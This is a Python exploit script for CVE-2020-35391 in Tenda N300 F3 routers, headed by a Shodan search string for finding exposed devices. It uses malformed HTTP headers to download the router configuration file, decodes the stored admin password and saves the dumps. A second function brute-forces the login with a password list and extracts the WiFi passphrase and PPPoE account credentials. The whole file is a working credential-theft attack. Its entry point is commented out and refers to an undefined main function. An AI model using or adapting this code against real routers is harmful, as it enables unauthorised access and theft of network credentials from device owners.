#!/usr/bin/python3

# Exploit Title: Tenda N300 F3 12.01.01.48 - Malformed HTTP Request Header Processing 
# Shodan Dork: http.favicon.hash:-2145085239 http.title:"Tenda | LOGIN"
# Date: 09/03/2023
# Exploit Author: @h454nsec
# Github: https://github.com/H454NSec/CVE-2020-35391
# Vendor Homepage: https://www.tendacn.com/default.html
# Product Link: https://www.tendacn.com/product/f3.html
# Version: All
# Tested on: F3v3.0 Firmware (confirmed)
# CVE : CVE-2020-35391

import re
import os
import sys
import argparse
import base64
import requests
import subprocess
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
try:
    import mmh3
    import codecs
except ImportError:
    print("[!] Install mmh3: pip3 install mmh3")
    sys.exit()

Color_Off="\033[0m" 
Black="\033[0;30m"        # Black
Red="\033[0;31m"          # Red
Green="\033[0;32m"        # Green
Yellow="\033[0;33m"       # Yellow
Blue="\033[0;34m"         # Blue
Purple="\033[0;35m"       # Purple
Cyan="\033[0;36m"         # Cyan
White="\033[0;37m"        # White

def ip_checker(ip):
    if "/" in ip:
        splited = ip.split("/")
        if "http://" in ip or "https://" in ip:
            return f"{splited[0]}://{splited[2]}"
        else:
            return f"http://{splited[0]}"
    else:
        return f"http://{ip}"

def is_tenda(ip):
    try:
        response = requests.get(f'{ip}/favicon.ico', timeout=5)
        favicon = codecs.encode(response.content, "base64")
        favicon_hash = mmh3.hash(favicon)
        if favicon_hash == -2145085239:
            return True
        return False
    except Exception as error:
        return False

def password_decoder(data):
    try:
        for nosense_data in data.split("\n"):
            if ("http_passwd=" in nosense_data):
                encoded_password = nosense_data.split("=", 1)[1]
                break
        password_bytes = base64.b64decode(encoded_password)
        password = password_bytes.decode("utf-8")
        if (len(password) != 0):
            return password
        return False
    except Exception as error:
        return False

def tenda_exploiter(ip):
    ip_address = ip_checker(ip)
    try:
        output = subprocess.check_output(f"curl {ip_address}/cgi-bin/DownloadCfg/RouterCfm.cfg -A '' -H 'Accept:' -H 'Host:' -s", shell=True, timeout=5)
        data = output.decode('utf-8')
        password = password_decoder(data)
        if password:
            if not os.path.isdir("config_dump"):
                os.mkdir("config_dump")
            with open(f"config_dump/{ip_address.split('/')[-1]}.cfg", "w") as o:
                o.write(data)
            print(f"{Green}[+]{Yellow} {ip_address}{Color_Off}", end="")
            print(f"{Purple}:{Cyan}{password}{Color_Off}")
            return password
        elif "Error" not in data:
            with open(f"config_dump/{ip_address.split('/')[-1]}.cfg", "w") as o:
                o.write(data)
            print(f"{Green}[+]{Yellow} {ip_address}{Color_Off}", end="")
            print(f"{Purple}:{Green}{'None'}{Color_Off}")
            return "None"
        else:
            print(f"{Red}[-]{Yellow} {ip_address}{Color_Off}")
            return False

    except Exception as error:
        print(error)
        return False
def tenda_brute(ip, passList):
    print("========= Scanning ==========")
    s = requests.Session()
    ip_address = ip_checker(ip)
    for passwd in passList:
        encode = base64.b64encode(bytes(passwd, 'utf-8')).decode('ascii')
        payload = {
            'password': encode
        }
        try:
            retry = Retry(connect=5, backoff_factor=3)
            adapter = HTTPAdapter(max_retries=retry)
            s.mount('http://', adapter)
            login = s.post('http://'+ip+'/login/Auth', data=payload, allow_redirects=True, timeout=5)
        except Exception as error:
            print(error)
            return False
        # TODO: Prevent program to stop after error
        if 'http://'+ip+'/index.html' == login.url:
            wifi = s.get('http://'+ip+'/goform/getWifi?modules=%2CwifiBasicCfg', timeout=5, stream=False)
            wan = s.get('http://'+ip+'/goform/getWAN?&modules=%2CwanBasicCfg', timeout=5, stream=False)
            credWifi = re.findall("\"wifi(?:SSID|Pwd)\":\"([^\"]*)\"", wifi.text)
            credWan = re.findall("\"wanPPPoE(?:User|Pwd)\":\"([^\"]*)\"", wan.text) 
            with open(f"config_dump/{ip_address.split('/')[-1]}.cfg", "w") as o:
                o.write(f"wl_ssid={credWifi[0]}\nwl_wpa_psk={credWifi[1]}\nwan0_pppoe_username={credWan[0]}\nwan0_pppoe_passwd={credWan[1]}")
            print("="*30)
            print("\033[32mPassword Found\033[39m : " + passwd)
            s.close()
            return passwd
        else:
            print("Trying "+passwd)
    return False
# passFile = open("wordList.txt", "r")
# passList = [passwd.strip() for passwd in passFile]
# lasttry = "elladmin"
# lastidx = passList.index(lasttry)
# tenda_brute("10.106.20.181:8080",passList)
# if __name__ == '__main__':
#     parser = argparse.ArgumentParser()
#     parser.add_argument('-i', '--ip', default='192.168.0.1', help='IP address of the target router (Default: http://192.168.0.1)')
#     parser.add_argument('-l', '--list_of_ip', help='List of IP address')
#     args = parser.parse_args()
#     db = []
#     ip_list = args.list_of_ip
#     if ip_list:
#         with open(ip_list, "r") as fr:
#             for data in fr.readlines():
#                 db.append(data.strip())
#     else:
#         db.append(args.ip)
#     main(db)